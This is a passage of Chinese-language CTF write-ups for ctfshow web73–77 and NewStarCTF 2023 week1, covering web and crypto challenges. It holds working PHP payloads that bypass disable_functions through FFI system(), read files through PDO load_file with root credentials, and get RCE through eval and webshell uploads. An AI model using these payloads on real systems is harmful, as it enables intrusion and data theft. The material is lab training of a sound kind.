class="hljs-number">62</span>%<span class="hljs-number">29</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">64</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">65</span>%<span class="hljs-number">78</span>%<span class="hljs-number">69</span>%<span class="hljs-number">74</span>%<span class="hljs-number">28</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">63</span>%<span class="hljs-number">74</span>%<span class="hljs-number">66</span>%<span class="hljs-number">73</span>%<span class="hljs-number">68</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">77</span>%<span class="hljs-number">28</span>%<span class="hljs-number">22</span>%<span class="hljs-number">63</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>f%<span class="hljs-number">66</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>%<span class="hljs-number">30</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">74</span>%<span class="hljs-number">78</span>%<span class="hljs-number">74</span>%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">6</span>f%<span class="hljs-number">62</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">64</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">66</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">75</span>%<span class="hljs-number">73</span>%<span class="hljs-number">68</span>%<span class="hljs-number">28</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b<br></code></pre></td></tr></table></figure><h3 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h3><p><code>c=var_export(scandir(&#39;/&#39;));exit();</code>   这次没有貌似<code>open_basedir</code><br><code>c=include(&#39;/flagc.txt&#39;);exit();</code></p><h3 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h3><p>ban了<code>scandir() </code><br>还得是glob<br><code>c=var_export(glob(&quot;/*&quot;));exit();</code><br><code>c=include(&#39;/flagx.txt&#39;);exit();</code></p><h3 id="web75"><a href="#web75" class="headerlink" title="web75"></a>web75</h3><p>ban了<code>scandir() </code><br><code>c=var_export(glob(&quot;/*&quot;));exit();</code>回显false</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>c=<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)<br>&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27; &#x27;</span>);<br>&#125; <br><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>s设置了<code>include_path</code>无法包含根目录文件<br>用前面的uaf脚本<br><img src="/mdimg/ctfshow77/18.png"><br>ban了<code>strlen()</code><br>官方解是用<code>PDO</code>读数据库<br><img src="/mdimg/ctfshow77/19.png"><br>官方解直接给了一个读<code>ctftraining</code> 的flag<br>实际上需要先找到这个数据库名<br>先连接默认数据库<code>information_schema</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-variable">$dsn</span> = <span class="hljs-string">&quot;mysql:host=localhost;dbname=information_schema&quot;</span>;<br>    <span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-variable">$dsn</span>, <span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>);<br>    <span class="hljs-variable">$rs</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;select group_concat(SCHEMA_NAME) from SCHEMATA&quot;</span>);<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$rs</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$row</span>)&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>]).<span class="hljs-string">&quot;|&quot;</span>; <br>      &#125;<span class="hljs-variable">$db</span> = <span class="hljs-literal">null</span>;<br>&#125; <span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p><img src="/mdimg/ctfshow77/20.png"><br>然后连接<code>ctftraining</code> 通过<code>load_file</code>来读取flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-variable">$dbh</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>,<br>        <span class="hljs-string">&#x27;root&#x27;</span>); <br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$dbh</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$row</span>) &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>]) . <span class="hljs-string">&quot;|&quot;</span>;<br>    &#125;<br>    <span class="hljs-variable">$dbh</span> = <span class="hljs-literal">null</span>;<br>&#125; <span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><h3 id="web76"><a href="#web76" class="headerlink" title="web76"></a>web76</h3><p><code>flag36d.txt</code>同上</p><h3 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h3><p>提示php 7.4<br>php 7.4 引入了 FFI扩展<br>FFI::cdef() 创建一个新的 FFI 对象</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$ffi</span> = FFI::<span class="hljs-title function_ invoke__">cdef</span>(<span class="hljs-string">&quot;int system(const char *command);&quot;</span>);  <br><span class="hljs-variable">$ffi</span>-&gt;<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;/readflag &gt; ./b.txt&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>通过FFI 引入c语言的system 突破disable——function的限制</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NewStarCTF 2023 week1 wp</title>
    <link href="/2023/10/04/NewStarCTF%202023%20week1/"/>
    <url>/2023/10/04/NewStarCTF%202023%20week1/</url>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="泄漏的秘密"><a href="#泄漏的秘密" class="headerlink" title="泄漏的秘密"></a>泄漏的秘密</h2><p>丁真<code>robots.txt</code> <code>www.zip</code></p><h2 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 1=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>] !== <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$flag1</span> = True;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 1&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag1</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 2=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$flag2</span> = True;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 2&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag2</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 3=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>],<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>)) == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-variable">$flag3</span> = True;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 3&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag3</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 4=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>] &gt; <span class="hljs-number">2023</span>)&#123;<br>            <span class="hljs-variable">$flag4</span> = True;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 4&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag4</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 5=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$var</span>)&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="hljs-variable">$var</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag5</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/mdimg/newstarweek1/1.png"><br>get:<code>?key1[]=1&amp;key2[]=2&amp;key4[]=4&amp;key5=2024a</code><br>post:<code>key3[]=3&amp;flag5=(&quot;%08%09%08%05&quot;^&quot;%7c%7b%7d%60&quot;)</code> 异或构造<code>true</code></p><h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$password</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$password</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)===<span class="hljs-string">&quot;c4d038&quot;</span>)&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">999999999999999</span>):<br>    x=hashlib.md5()<br>    x.update(<span class="hljs-built_in">str</span>(i).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    des=x.hexdigest()<br>    <span class="hljs-keyword">if</span> des[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>]==<span class="hljs-string">&#x27;c4d038&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-comment">#114514</span><br></code></pre></td></tr></table></figure><p><code>password=114514&amp;e[v.a.l=var_dump(scandir(&#39;/&#39;));</code> –&gt; <code>flag</code><br><code>password=114514&amp;e[v.a.l=var_dump(exec(&#39;tac /fl?g&#39;));</code></p><h2 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h2><p><img src="/mdimg/newstarweek1/2.png"><br>抓包发现密码为md5形式的<br>先尝试数字弱密码， 6-18位数字<br><img src="/mdimg/newstarweek1/3.png"><br>密码就是<code>000000</code>……<br>重新登录抓包<br><img src="/mdimg/newstarweek1/4.png"><br>放包然后再抓包<code>[http://node4.buuoj.cn:26958](http://node4.buuoj.cn:26958)/passport/2c702a27a0f27a5c60daf3887be50e515801b211c9d8418ee4d792ce8d924897.php</code><br><img src="/mdimg/newstarweek1/5.png"></p><h2 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h2><p><code>/?number1=a&amp;number2=a</code>报错直接找flag<br><img src="/mdimg/newstarweek1/6.png"></p><h2 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h2><p><img src="/mdimg/newstarweek1/13.png"><br><img src="/mdimg/newstarweek1/7.png"></p><h2 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h2><p>上传图片🐎抓包改后缀php rce</p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="babyxor"><a href="#babyxor" class="headerlink" title="babyxor"></a>babyxor</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> *<br><br>ciphertext = []<br><br><span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> flag:<br>    ciphertext.append(f ^ key)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(ciphertext).<span class="hljs-built_in">hex</span>())<br><span class="hljs-comment"># e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2</span><br></code></pre></td></tr></table></figure><p>先推key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># print(ord(&#x27;f&#x27;)^int(&#x27;e9&#x27;,16))   143</span><br><span class="hljs-comment"># print(ord(&#x27;l&#x27;)^int(&#x27;e3&#x27;,16))   143</span><br><br>key=<span class="hljs-number">143</span><br><br>a=<span class="hljs-string">&#x27;e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(a),<span class="hljs-number">2</span>):<br>  <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(a[i:i+<span class="hljs-number">2</span>],<span class="hljs-number">16</span>)^key),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-comment">#flag&#123;x0r_15_symm3try_and_e4zy!!!!!!&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Vigenere"><a href="#Vigenere" class="headerlink" title="Vigenère"></a>Vigenère</h2><p><img src="/mdimg/newstarweek1/8.png"><br><img src="/mdimg/newstarweek1/9.png"></p><h2 id="babyencoding"><a href="#babyencoding" class="headerlink" title="babyencoding"></a>babyencoding</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">part <span class="hljs-number">1</span> of flag: ZmxhZ3tkYXp6bGluZ19lbmNvZGluZyM0ZTBhZDQ=        base64<br>part <span class="hljs-number">2</span> of flag: MYYGGYJQHBSDCZJRMQYGMMJQMMYGGN3BMZSTIMRSMZSWCNY=       base32<br>part <span class="hljs-number">3</span> of flag: =8S4U,3DR8SDY,C`S-F5F-C(S,S&lt;R-C`Q9F8S87T`              uudecode<br></code></pre></td></tr></table></figure><h2 id="Small-d"><a href="#Small-d" class="headerlink" title="Small d"></a>Small d</h2><p>维纳攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> libnum<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">continuedFra</span>(<span class="hljs-params">x, y</span>):<br><br>    cf = []<br>    <span class="hljs-keyword">while</span> y:<br>        cf.append(x // y)<br>        x, y = y, x % y<br>    <span class="hljs-keyword">return</span> cf<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gradualFra</span>(<span class="hljs-params">cf</span>):<br>    numerator = <span class="hljs-number">0</span><br>    denominator = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> cf[::-<span class="hljs-number">1</span>]:<br>        <span class="hljs-comment"># 这里的渐进分数分子分母要分开</span><br>        numerator, denominator = denominator, x * denominator + numerator<br>    <span class="hljs-keyword">return</span> numerator, denominator<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve_pq</span>(<span class="hljs-params">a, b, c</span>):<br>    par = gmpy2.isqrt(b * b - <span class="hljs-number">4</span> * a * c)<br>    <span class="hljs-keyword">return</span> (-b + par) // (<span class="hljs-number">2</span> * a), (-b - par) // (<span class="hljs-number">2</span> * a)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getGradualFra</span>(<span class="hljs-params">cf</span>):<br>    gf = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(cf) + <span class="hljs-number">1</span>):<br>        gf.append(gradualFra(cf[:i]))<br>    <span class="hljs-keyword">return</span> gf<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">wienerAttack</span>(<span class="hljs-params">e, n</span>):<br>    cf = continuedFra(e, n)<br>    gf = getGradualFra(cf)<br>    <span class="hljs-keyword">for</span> d, k <span class="hljs-keyword">in</span> gf:<br>        <span class="hljs-keyword">if</span> k == <span class="hljs-number">0</span>: <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> (e * d - <span class="hljs-number">1</span>) % k != <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">continue</span><br>        phi = (e * d - <span class="hljs-number">1</span>) // k<br>        p, q = solve_pq(<span class="hljs-number">1</span>, n - phi + <span class="hljs-number">1</span>, n)<br>        <span class="hljs-keyword">if</span> p * q == n:<br>            <span class="hljs-keyword">return</span> d<br><br>n = <br>e = <br>c = <br>d = wienerAttack(e, n)<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><span class="hljs-built_in">print</span>(libnum.n2s(m))<br></code></pre></td></tr></table></figure><h2 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h2><p>n分解多个因数</p><p>yafu分解 </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">p_list</span> =<span class="hljs-meta"> []</span><br><span class="hljs-attribute">phi</span>= <span class="hljs-number">1</span><br><span class="hljs-attribute">for</span> p in p_list:<br>    <span class="hljs-attribute">phi</span> *= (p-<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>循环求欧拉函数就行</p><h2 id="fence"><a href="#fence" class="headerlink" title="fence"></a>fence</h2><p><img src="/mdimg/newstarweek1/10.png"></p><h2 id="Caesar’s-Secert"><a href="#Caesar’s-Secert" class="headerlink" title="Caesar’s Secert"></a>Caesar’s Secert</h2><p><img src="/mdimg/newstarweek1/11.png"></p><h2 id="brainfuck"><a href="#brainfuck" class="headerlink" title="brainfuck"></a>brainfuck</h2><p><img src="/mdimg/newstarweek1/12.png"></p><h2 id="Affine"><a href="#Affine" class="headerlink" title="Affine"></a>Affine</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag, 